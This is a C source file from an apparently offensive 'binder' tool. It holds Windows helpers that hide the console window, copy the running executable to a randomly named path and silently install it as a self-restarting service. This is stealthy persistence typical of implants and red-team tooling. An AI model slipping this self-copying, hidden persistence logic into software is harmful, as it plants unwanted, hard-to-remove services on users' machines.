// WinSHock Binder (WsBind) Windows API Stub
// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

typedef void (*ServiceFunction)(int**);

typedef struct SERVICEOPTIONS
{
    char* name;
    int timeout;
    int* running;
    ServiceFunction function;
} ServiceOptions;

ServiceOptions wsServiceOptions;

HANDLE wsSCV_Event;
DWORD wsSVC_State = 0;
BOOL wsSVC_Stop = FALSE;
SERVICE_STATUS_HANDLE wsSVC_Status;

void WINAPI __wsw_svc_main(DWORD wsArgc, LPTSTR *wsArgv);
DWORD WINAPI __wsw_svc_handler(DWORD wsControl, DWORD wsEventType, void *wsEventData, void *wsContext);
int wsw_install_service(char* wsServicePath, char* wsServiceName, char* wsServiceStart, BOOL wsStartNow);

int wsw_pid()
{
	// Add hook for linux
    return GetCurrentProcessId();
}
char* wsw_uid()
{
    char wsUsBuf[WSB_LSTRING];
    DWORD wsUsLen = WSB_LSTRING;
    if(GetUserName(wsUsBuf, &wsUsLen))
    {
        char* wsNewBuf = calloc(wsUsLen, sizeof(char));
        strncpy(wsNewBuf, wsUsBuf, wsUsLen);
        return wsNewBuf;
    }
    return NULL;
}
char* wsw_pwd()
{
    char wsPwdBuf[WSB_LSTRING];
    DWORD wsPwdLen = WSB_LSTRING;
    if(GetCurrentDirectory(wsPwdLen, wsPwdBuf))
    {
        char* wsNewBuf = calloc(wsPwdLen, sizeof(char));
        strncpy(wsNewBuf, wsPwdBuf, wsPwdLen);
        return wsNewBuf;
    }
    return NULL;
}
char* wsw_path()
{
    char wsFileBuf[WSB_LSTRING];
    DWORD wsFileLen = WSB_LSTRING;
    if(GetModuleFileName(NULL, wsFileBuf, wsFileLen))
    {
        char* wsNewBuf = calloc(wsFileLen, sizeof(char));
        strncpy(wsNewBuf, wsFileBuf, wsFileLen);
        return wsNewBuf;
    }
    return NULL;
}
void wsw_hide_window()
{
    HWND wsWindow = GetConsoleWindow();
    ShowWindow(wsWindow, SW_MINIMIZE);
    ShowWindow(wsWindow, SW_HIDE);
}
int wsw_set_path(char* wsNewPath)
{
    if(SetCurrentDirectory(wsNewPath) == 0)
    {
        char *wsCurDir = wsw_pwd(), wsNewDir[WSB_LSTRING];
        if(wsCurDir != NULL)
        {
            sprintf(wsNewDir, "%s\\%s", wsCurDir, wsNewPath);
            free(wsCurDir);
            if (SetCurrentDirectory(wsNewDir) == 0) return WSB_FAIL;
            return WSB_SUCCESS;
        }
        return WSB_FAIL;
    }
    return WSB_SUCCESS;
}
int wsw_hook_process_dll(int wsSafe, char* wsDLLPath)
{
    return 0;
}
int wsw_service_restart_on_fail(char* wsServiceName, int wsSeconds)
{
    if(wsSeconds <= 0) return WSB_FAIL;
    char* wsSvcConfig = calloc((strlen(WSW_SVC_SET_FAILURE) - 2) + strlen(wsServiceName) + 8, 1);
    sprintf(wsSvcConfig, WSW_SVC_SET_FAILURE, wsServiceName, wsSeconds * 1000);
    wsp_execv(wsSvcConfig, NULL, WSP_HIDDEN_PROC);
    free(wsSvcConfig);
    return WSB_SUCCESS;
}
int wsw_service(char* wsServiceName, int wsServiceTime, ServiceFunction wsServiceMain)
{
    wsServiceOptions.timeout = wsServiceTime;
    wsServiceOptions.function = wsServiceMain;
    if(wsServiceName == NULL)
    {
        wsServiceOptions.name = calloc(strlen(WSW_SVC_DEFAULT_NAME), 1);
        strncpy(wsServiceOptions.name, WSW_SVC_DEFAULT_NAME, strlen(WSW_SVC_DEFAULT_NAME));
    }
    else
    {
        wsServiceOptions.name = calloc(strlen(wsServiceName), 1);
        strncpy(wsServiceOptions.name, wsServiceName, strlen(wsServiceName));
    }
    SERVICE_TABLE_ENTRY serviceTable[] = {
            { "", &__wsw_svc_main }, { NULL, NULL }
    };
    if (StartServiceCtrlDispatcher(serviceTable)) return 0;
    else if (GetLastError() == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) return -1;
    return -2;
}
int wsw_this_as_service(char* wsServiceName, char* wsServiceStart, BOOL wsStart, char* wsBinArgs)
{
    BOOL wsReturn = FALSE;
    int wsTries = 0, wsReturnIns = 0;
    char* wsNewFile, *wsCurrentPath = wsw_path();
    for(; wsTries < 10 && !wsReturn; wsTries++)
    {
        wsNewFile = wsu_randomString(10, WSW_SVC_PATH_START, WSW_SVC_PATH_END);
        if(wsNewFile != NULL)
        {
            wsReturn = CopyFile(wsCurrentPath, wsNewFile, TRUE);
            if(wsReturn == FALSE) free(wsNewFile);
        }
    }
    if(wsReturn == TRUE)
    {
        if(wsBinArgs != NULL)
        {
            char* wsNewFileArgs = calloc(strlen(wsNewFile) + strlen(wsBinArgs) + 1, 1);
            sprintf(wsNewFileArgs, WSW_SVC_PATH_ARGS, wsNewFile, wsBinArgs);
            wsReturnIns = wsw_install_service(wsNewFileArgs, wsServiceName, wsServiceStart, wsStart);
            free(wsNewFileArgs);
        }
        else
            wsReturnIns = wsw_install_service(wsNewFile, wsServiceName, wsServiceStart, wsStart);
        free(wsNewFile);
    }
    free(wsCurrentPath);
    return wsReturn ? wsReturnIns : WSB_FAIL;
}
int wsw_install_service(char* wsServicePath, char* wsServiceName, char* wsServiceStart, BOOL wsStartNow)
{
    if(wsServiceName == NULL || wsServicePath == NULL) return 0;
    char* wsSvcInstall = calloc((strlen(WSW_SVC_INSTALL) - 2) + strlen(wsServiceName) + strlen(wsServicePath), 1);
    sprintf(wsSvcInstall, WSW_SVC_INSTALL, wsServiceName, wsServicePath);
    wsp_execv(wsSvcInstall, NULL, WSP_HIDDEN_PROC);
    free(wsSvcInstall);
    if(wsStartNow == TRUE)
    {
        char* wsSvcStart = calloc((strlen(WSW_SVC_START) - 1) + strlen(wsServiceName), 1);
        sprintf(wsSvcStart, WSW_SVC_START, wsServiceName);
        wsp_execv(wsSvcStart, NULL, WSP_HIDDEN_PROC);
        free(wsSvcStart);
    }
    if(wsServiceStart != NULL)
    {
        char* wsSvcConfig = calloc((strlen(WSW_SVC_SET_START) - 2) + strlen(wsServiceName) + strlen(wsServiceStart), 1);
        sprintf(wsSvcConfig, WSW_SVC_SET_START, wsServiceName, wsServiceStart);
        wsp_execv(wsSvcConfig, NULL, WSP_HIDDEN_PROC);
        free(wsSvcConfig);
    }
    return WSB_SUCCESS;
}

void __wsw_svc_status(DWORD wsState)
{
    wsSVC_State = wsState;
    SERVICE_STATUS serviceStatus = {
        SERVICE_WIN32_OWN_PROCESS, wsSVC_State,
        wsState == SERVICE_START_PENDING ? 0 : SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN,
        NO_ERROR, 0, 0, 0,
    };
    SetServiceStatus(wsSVC_Status, &serviceStatus);
}
void WINAPI __wsw_svc_main(DWORD wsArgc, LPTSTR *wsArgv)
{
    wsSVC_Status = RegisterServiceCtrlHandlerEx(wsServiceOptions.name, &__wsw_svc_handler, NULL);
    __wsw_svc_status(SERVICE_START_PENDING);
    wsSCV_Event = CreateEvent(NULL, TRUE, FALSE, NULL);
    __wsw_svc_status(SERVICE_RUNNING);
    wsServiceOptions.running = (int*)1;
    if(wsServiceOptions.timeout > 0)
        while(WaitForSingleObject(wsSCV_Event, wsServiceOptions.timeout) != WAIT_OBJECT_0)
            wsServiceOptions.function(&wsServiceOptions.running);
    else
        wsServiceOptions.function(&wsServiceOptions.running);
    __wsw_svc_status(SERVICE_STOP_PENDING);
    CloseHandle(wsSCV_Event);
    __wsw_svc_status(SERVICE_STOPPED);
}
DWORD WINAPI __wsw_svc_handler(DWORD wsControl, DWORD wsEventType, void *wsEventData, void *wsContext)
{
    switch(wsControl)
    {
    case SERVICE_CONTROL_SHUTDOWN:
        wsSVC_Stop = TRUE;
    case SERVICE_CONTROL_STOP:
        __wsw_svc_status(SERVICE_STOP_PENDING);
        SetEvent(wsSCV_Event);
        wsServiceOptions.running = 0;
        break;
    default:
        __wsw_svc_status(wsSVC_State);
        break;
    }
    return NO_ERROR;
}